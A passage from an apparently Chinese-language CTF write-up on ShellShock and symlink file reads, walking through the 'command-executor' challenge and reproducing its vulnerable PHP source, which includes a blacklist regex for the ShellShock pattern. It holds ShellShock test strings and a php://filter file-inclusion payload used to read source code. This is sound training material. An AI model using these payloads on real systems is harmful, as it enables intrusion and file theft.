</code>均可以读取到<code>/flag</code>的内容。</p><p><img src=https://blogpic.zdy.one/img/20190610005445.jpg loading=lazy></p><p>这个软链接读取文件内容已经被多次利用</p><ul><li>在 GitLab CVE-2016-9086 也是利用了这点，参考<a class=link href=https://paper.seebug.org/104/ target=_blank rel=noopener>GitLab 任意文件读取漏洞 (CVE-2016-9086) 和任意用户 token 泄露漏洞</a></li><li>CTF 中也出现了类似的题目，参考<a class=link href=https://xz.aliyun.com/t/2589 target=_blank rel=noopener>一个有趣的任意文件读取</a>，以及在 2018 年赛博地球杯上有一道题也是利用这个点，参考<a class=link href=https://cl0und.github.io/2018/01/20/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95/ target=_blank rel=noopener>记录一道题的多种解法</a>，<a class=link href="https://www.xctf.org.cn/library/details/cyberearth-writeup/?from=groupmessage&amp;isappinstalled=0" target=_blank rel=noopener>“赛博地球杯”工业互联网安全大赛线上赛Writeup</a></li></ul><h4 id=shellshockcve-2014-6271>ShellShock(CVE-2014-6271)</h4><p>Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的 shell 命令，甚至完全控制目标系统，详细分析参考<a class=link href=https://www.freebuf.com/articles/system/45390.html target=_blank rel=noopener>破壳（ShellShock）漏洞样本分析报告</a></p><blockquote><ul><li><p>CVE-2014-6271 测试方式:</p><p>env x=&rsquo;() { :;}; echo vulnerable&rsquo; bash -c &ldquo;echo this is a test&rdquo;</p></li><li><p>CVE-2014-7169 测试方式:(CVE-2014-6271补丁更新后仍然可以绕过)
env -i X=&rsquo;;() { (a)=>' bash -c &rsquo;echo date&rsquo;; cat echo</p></li></ul></blockquote><h4 id=从一道题看shell-shock>从一道题看Shell Shock</h4><p>题目地址：<a class=link href=https://command-executor.hackme.inndy.tw/index.php target=_blank rel=noopener>command-executor</a>——来源于 <a class=link href=https://hackme.inndy.tw target=_blank rel=noopener>HackMe</a></p><p>题目描述：</p><blockquote><p>​ Here&rsquo;s my useless developer assistant website, try to execute your own command!</p></blockquote><p>题目大体思路是：</p><ul><li>读取源码</li><li>Shell Shock命令执行</li><li>重定向读写文件</li></ul><p>题目设置为几个功能，一个<code>man</code>命令的帮助文档</p><p><img src=https://blogpic.zdy.one/img/20190610000217.jpg loading=lazy></p><p>选择了<code>ls</code>，多了个请求参数<code>file=ls</code></p><p><img src=https://blogpic.zdy.one/img/20190610009784.jpg loading=lazy></p><p>尝试用其他命令，比如<code>find</code></p><p><img src=https://blogpic.zdy.one/img/20190610003424.jpg loading=lazy></p><p>猜测<code>eval("man /bin/" + command)</code>或者一些其他的目录</p><p><code>Tar Tester</code>界面可以上传压缩包但是并没有解压，只是<code>tar -tvf test.tar</code>查看压缩包内的内容</p><p><img src=https://blogpic.zdy.one/img/20190610006647.jpg loading=lazy></p><p><code>Cmd Exec</code>界面只有两个命令，一个<code>ls</code>，一个<code>env</code></p><p><img src=https://blogpic.zdy.one/img/20190610000773.jpg loading=lazy></p><p><code>List files</code>是个目录列举界面，可以列举几个目录</p><p><img src=https://blogpic.zdy.one/img/20190610008062.jpg loading=lazy></p><p>观察题目，题目 url<code>https://command-executor.hackme.inndy.tw/index.php?func=untar</code>等均带有<code>func=xxx</code>参数来展示页面，猜测会有文件包含漏洞，尝试使用<code>func=php://filter/read=convert.base64-encode/resource=index</code>读取文件内容，成功得到回显</p><p><img src=https://blogpic.zdy.one/img/20190610000836.jpg loading=lazy></p><p>解码得到 <code>index.php</code>源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span><span class=lnt>94
</span><span class=lnt>95
</span><span class=lnt>96
</span><span class=lnt>97
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>$pages = [
</span></span><span class=line><span class=cl>    [&#39;man&#39;, &#39;Man&#39;],
</span></span><span class=line><span class=cl>    [&#39;untar&#39;, &#39;Tar Tester&#39;],
</span></span><span class=line><span class=cl>    [&#39;cmd&#39;, &#39;Cmd Exec&#39;],
</span></span><span class=line><span class=cl>    [&#39;ls&#39;, &#39;List files&#39;],
</span></span><span class=line><span class=cl>];
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>function fuck($msg) {
</span></span><span class=line><span class=cl>    header(&#39;Content-Type: text/plain&#39;);
</span></span><span class=line><span class=cl>    echo $msg;
</span></span><span class=line><span class=cl>    exit;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$black_list = [
</span></span><span class=line><span class=cl>    &#39;\/flag&#39;, &#39;\(\)\s*\{\s*:;\s*\};&#39;
</span></span><span class=line><span class=cl>];
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>function waf($a) {
</span></span><span class=line><span class=cl>    global $black_list;
</span></span><span class=line><span class=cl>    if(is_array($a)) {
</span></span><span class=line><span class=cl>        foreach($a as $key =&gt; $val) {
</span></span><span class=line><span class=cl>            waf($key);
</span></span><span class=line><span class=cl>            waf($val);
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    } else {
</span></span><span class=line><span class=cl>        foreach($black_list as $b) {
</span></span><span class=line><span class=cl>            if(preg_match(&#34;/$b/&#34;, $a) === 1) {
</span></span><span class=line><span class=cl>                fuck(&#34;$b detected! exit now.&#34;);
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>waf($_SERVER);
</span></span><span class=line><span class=cl>waf($_GET);
</span></span><span class=line><span class=cl>waf($_POST);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>function execute($cmd, $shell=&#39;bash&#39;) {
</span></span><span class=line><span class=cl>    system(sprintf(&#39;%s -c %s&#39;, $shell, escapeshellarg($cmd)));
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>foreach($_SERVER as $key =&gt; $val) {
</span></span><span class=line><span class=cl>    if(substr($key, 0, 5) === &#39;HTTP_&#39;) {
</span></span><span class=line><span class=cl>        putenv(&#34;$key=$val&#34;);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$page = &#39;&#39;;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if(isset($_GET[&#39;func&#39;])) {
</span></span><span class=line><span class=cl>    $page = $_GET[&#39;func&#39;];
</span></span><span class=line><span class=cl>    if(strstr($page, &#39;..&#39;) !== false) {
</span></span><span class=line><span class=cl>        $page = &#39;&#39;;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if($page &amp;&amp; strlen($page) &gt; 0) {
</span></span><span class=line><span class=cl>    try {
</span></span><span class=line><span class=cl>        include(&#34;$page.php&#34;);
</span></span><span class=line><span class=cl>    } catch (Exception $e) {
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>function render_default() { ?&gt;
</span></span><span class=line><span class=cl>&lt;p&gt;Welcome to use our developer assistant service. We provide servial useless features to make your developing life harder.&lt;/p&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;img src=&#34;windows-run.jpg&#34; alt=&#34;command executor&#34;&gt;
</span></span><span class=line><span class=cl>&lt;?php }
</span></span><span class=line><span class=cl>?&gt;&lt;!DOCTYPE html&gt;
</span></span><span class=line><span class=cl>&lt;html lang=&#34;en&#34;&gt;
</span></span><span class=line><span class=cl>  &lt;head&gt;
</span></span><span class=line><span class=cl>    &lt;meta charset=&#34;UTF-8&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;title&gt;Command Executor&lt;/title&gt;
</span></span><span class=line><span class=cl>    &lt;link rel=&#34;stylesheet&#34; href=&#34;bootstrap/css/bootstrap.min.css&#34; media=&#34;all&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;link rel=&#34;stylesheet&#34; href=&#34;comic-neue/font.css&#34; media=&#34;all&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;style&gt;
</span></span><span class=line><span class=cl>      nav { margin-bottom: 1rem; }
</span></span><span class=line><span class=cl>      img { max-width: 100%; }
</span></span><span class=line><span class=cl>    &lt;/style&gt;
</span></span><span class=line><span class=cl>  &lt;/head&gt;
</span></span><span class=line><span class=cl>  &lt;body&gt;
</span></span><span class=line><span class=cl>    &lt;nav class=&#34;navbar navbar-expand-lg navbar-dark bg-dark d-flex&#34;&gt;
</span></span><span class=line><span class=cl>      &lt;a class=&#34;navbar-brand&#34; href=&#34;index.php&#34;&gt;Command Executor&lt;/a&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      &lt;ul class=&#34;navbar-nav&#34;&gt;
</span></span><span class=line><span class=cl>&lt;?php foreach($pages as list($file, $title)): ?&gt;
</span></span><span class=line><span class=cl>        &lt;li class=&#34;nav-item&#34;&gt;
</span></span><span class=line><span class=cl>          &lt;a class=&#34;nav-link&#34; href=&#34;index.php?func=&lt;?=$file?&gt;&#34;&gt;&lt;?=$title?&gt;&lt;/a&gt;
</span></span><span class=line><span class=cl>        &lt;/li&gt;
</span></span><span class=line><span class=cl>&lt;?php endforeach; ?&gt;
</span></span><span class=line><span class=cl>      &lt;/ul&gt;
</span></span><span class=line><span class=cl>    &lt;/nav&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    &lt;div class=&#34;container&#34;&gt;&lt;?php if(is_callable(&#39;render&#39;)) render(); else render_default(); ?&gt;&lt;/div&gt;
</span></span><span class=line><span class=cl>  &lt;/body&gt;
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span></code></pre></td></tr></table></div></div><p><code>man.php</code>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>render</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$file</span> <span class=o>=</span> <span class=s1>&#39;man&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$file</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^[\w\-]+$/&#39;</span><span class=p>,</span> <span class=nv>$file</span><span class=p>)</span> <span class=o>!==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s1>&#39;&lt;pre&gt;Invalid file name!&lt;/pre&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;&lt;h1&gt;Online documents&lt;/h1&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$cmds</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;bash&#39;</span><span class=p>,</span> <span class=s1>&#39;ls&#39;</span><span class=p>,</span> <span class=s1>&#39;cp&#39;</span><span class=p>,</span> <span class=s1>&#39;mv&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;&lt;ul&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>foreach</span><span class=p>(</span><span class=nv>$cmds</span> <span class=k>as</span> <span class=nv>$cmd</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>printf</span><span class=p>(</span><span class=s1>&#39;&lt;li&gt;&lt;a href=&#34;index.php?func=man&amp;file=%s&#34;&gt;%1$s&lt;/a&gt;&lt;/li&gt;&#39;</span><span class=p>,</span> <span class=nv>$cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;&lt;/ul&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>printf</span><span class=p>(</span><span class=s1>&#39;&lt;h2&gt;$ man %s&lt;/h2&gt;&#39;</span><span class=p>,</span> <span class=nx>htmlentities</span><span class=p>(</span><span class=nv>$file</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;&lt;pre&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>execute</span><span class=p>(</span><span class=nx>sprintf</span><span class=p>(</span><span class=s1>&#39;man %s | cat&#39;</span><span class=p>,</span> <span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$file</span><span class=p>)));</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;&lt;/pre&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p><code>untar.php</code>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>render</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;h1&gt;Tar file tester&lt;/h1&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;p&gt;Please upload a tar file to test&lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;form enctype=&#34;multipart/form-data&#34; action=&#34;index.php?func=untar&#34; method=&#34;POST&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>  &lt;input type=&#34;file&#34; name=&#34;tarfile&#34; id=&#34;tarfile&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>  &lt;input class=&#34;btn btn-primary&#34; type=&#34;submit&#34; value=&#34;Upload &amp;amp; Test&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/form&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;?php
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>    if(isset($_FILES[&#39;tarfile&#39;])) {
</span></span></span><span class=line><span class=cl><span class=err>        printf(&#39;&lt;h2&gt;$ tar -tvf %s&lt;/h2&gt;&#39;, htmlentities($_FILES[&#39;tarfile&#39;][&#39;name&#39;]));
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        echo &#39;&lt;pre&gt;&#39;;
</span></span></span><span class=line><span class=cl><span class=err>        execute(sprintf(&#39;tar -tvf %s 2&gt;&amp;1&#39;, escapeshellarg($_FILES[&#39;tarfile&#39;][&#39;tmp_name&#39;])));
</span></span></span><span class=line><span class=cl><span class=err>        echo &#39;&lt;/pre&gt;&#39;;
</span></span></span><span class=line><span class=cl><span class=err>    }
</span></span></span><span class=line><span class=cl><span class=err>}
</span></span></span><span class=line><span class=cl><span class=err>?&gt;
</span></span></span></code></pre></td></tr></table></div></div><p><code>ls.php</code>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>render</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$file</span> <span class=o>=</span> <span class=s1>&#39;.&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$file</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;&lt;h1&gt;Dictionary Traversal&lt;/h1&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;&lt;ul&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$dirs</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;.&#39;</span><span class=p>,</span> <span class=s1>&#39;..&#39;</span><span class=p>,</span> <span class=s1>&#39;../..&#39;</span><span class=p>,</span> <span class=s1>&#39;/etc/passwd&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>foreach</span><span class=p>(</span><span class=nv>$dirs</span> <span class=k>as</span> <span class=nv>$dir</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>printf</span><span class=p>(</span><span class=s1>&#39;&lt;li&gt;&lt;a href=&#34;index.php?func=ls&amp;file=%s&#34;&gt;%1$s&lt;/a&gt;&lt;/li&gt;&#39;</span><span class=p>,</span> <span class=nv>$dir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;&lt;/ul&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>printf</span><span class=p>(</span><span class=s1>&#39;&lt;h2&gt;$ ls %s&lt;/h2&gt;&#39;</span><span class=p>,</span> <span class=nx>htmlentities</span><span class=p>(</span><span class=nv>$file</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;&lt;pre&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>execute</span><span class=p>(</span><span class=nx>sprintf</span><span class=p>(</span><span class=s1>&#39;ls -l %s&#39;</span><span class=p>,</span> <span class=nx>escapeshellarg</span><span class=p>(</span><span class=nv>$file</span><span class=p>)));</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;&lt;/pre&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p><code>cmd.php</code>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>render</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$cmd</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$cmd</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;h1&gt;Command Execution&lt;/h1&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;?php
</span></span></span><span class=line><span class=cl><span class=err>    echo &#39;&lt;ul&gt;&#39;;
</span></span></span><span class=line><span class=cl><span class=err>    $cmds = [&#39;ls&#39;, &#39;env&#39;];
</span></span></span><span class=line><span class=cl><span class=err>    foreach($cmds as $c) {
</span></span></span><span class=line><span class=cl><span class=err>        printf(&#39;&lt;li&gt;&lt;a href=&#34;index.php?func=cmd&amp;cmd=%s&#34;&gt;%1$s&lt;/a&gt;&lt;/li&gt;&#39;, $c);
</span></span></span><span class=line><span class=cl><span class=err>    }
</span></span></span><span class=line><span class=cl><span class=err>    echo &#39;&lt;/ul&gt;&#39;;
</span></span></span><span class=line><span class=cl><span class=err>?&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;form action=&#34;index.php&#34; method=&#34;GET&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>  &lt;input type=&#34;hidden&#34; name=&#34;func&#34; value=&#34;cmd&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>  &lt;div class=&#34;input-group&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;input class=&#34;form-control&#34; type=&#34;text&#34; name=&#34;cmd&#34; id=&#34;cmd&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;div class=&#34;input-group-append&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>      &lt;input class=&#34;btn btn-primary&#34; type=&#34;submit&#34; value=&#34;Execute&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>  &lt;/div&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/form&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;script&gt;cmd.focus();&lt;/script&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;?php
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>    if(strlen($cmd) &gt; 0) {
</span></span></span><span class=line><span class=cl><span class=err>        printf(&#39;&lt;h2&gt;$ %s&lt;/h2&gt;&#39;, htmlentities($cmd));
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        echo &#39;&lt;pre&gt;&#39;;
</span></span></span><span class=line><span class=cl><span class=err>        switch ($cmd) {
</span></span></span><span class=line><span class=cl><span class=err>        case &#39;env&#39;:
</span></span></span><span class=line><span class=cl><span class=err>        case &#39;ls&#39;:
</span></span></span><span class=line><span class=cl><span class=err>        case &#39;ls -l&#39;:
</span></span></span><span class=line><span class=cl><span class=err>        case &#39;ls -al&#39;:
</span></span></span><span class=line><span class=cl><span class=err>            execute($cmd);
</span></span></span><span class=line><span class=cl><span class=err>            break;
</span></span></span><span class=line><span class=cl><span class=err>        case &#39;cat flag&#39;:
